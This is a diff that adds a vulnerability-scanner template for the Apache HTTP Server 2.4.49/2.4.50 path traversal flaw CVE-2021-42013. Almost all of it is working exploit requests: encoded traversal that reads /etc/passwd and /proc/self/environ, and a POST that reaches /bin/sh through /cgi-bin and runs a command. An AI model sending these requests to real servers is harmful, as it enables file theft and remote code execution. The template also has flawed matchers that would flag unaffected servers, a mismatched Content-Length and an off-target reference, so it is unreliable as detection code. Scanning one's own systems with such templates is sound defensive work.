@@ -1,0 +1,65 @@
+id: apache-path-traversal-cve-2021-42013
+
+info:
+  name: Apache 2.4.49 2.4.50 Path Traversal (CVE-2021-42013)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts, which may lead to remote code execution by an attacker.
+  tags: directory-traversal
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+    - https://twitter.com/roman_soft/status/1446252280597078024
+
+http:
+  - raw:
+      - |
+        GET /icons/.%252e/.%252e/.%252e/.%252e/.%252e{{file}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    payloads:
+      file:
+        - /etc/passwd
+        - /etc/hosts
+        - /proc/self/environ
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+        part: body
+      - type: word
+        words:
+          - "127.0.0.1"
+        part: body
+      - type: regex
+        regex:
+          - ".*Content-Encoding: gzip.*"
+        part: header
+
+  - raw:
+      - |
+        POST /cgi-bin/.%252e/.%252e/.%252e/.%252e/.%252e/bin/sh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 42
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        echo Content-Type: text/plain; echo; whoami
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "^[a-z_][a-z0-9_]{0,30}:[x*]:[0-9]{1,4}:[0-9]{1,4}.*"
+        part: body
+      - type: word
+        words:
+          - "uid="
+        part: body
